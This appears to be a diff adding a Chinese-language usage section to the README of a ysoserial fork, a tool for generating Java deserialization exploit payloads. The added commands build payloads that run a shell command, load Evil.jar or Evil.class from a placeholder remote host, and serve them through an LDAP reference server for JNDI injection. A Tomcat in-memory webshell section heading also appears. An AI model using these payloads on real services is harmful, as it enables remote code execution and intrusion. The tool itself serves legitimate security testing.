@@ -13,6 +13,23 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ![logo](ysoserial.png)
 
+## 快速批量生成ser序列化payload数据
+例：
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CMD '/bin/bash' '-c' '/System/Applications/Calculator.app/Contents/MacOS/Calculator'
+```
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JAR 'http://xxx.xxx.xxx:8080/Evil.jar'
+```
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CODEBASE 'http://xxx.xxx.xxx:8080:Evil.class'
+```
+生成的ser文件会在当前目录的out_ser目录下，若是JNDI注入攻击，建议配合我fork并魔改过的marshalsec进行FUZZ，参考：https://github.com/threedr3am/marshalsec
+```
+java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1#Evil.class /tmp/out_ser
+```
+当使用序列化gadget攻击jdk8u191+的服务时，上面的http://127.0.0.1#Evil.class随意填写，起作用得是目录/tmp/out_ser下的payload，会遍历进行发送，若是jdk8u191-，那就使用codebase直接打
+
 ## tomcat通杀回显-内存webshell
 例：
 ```
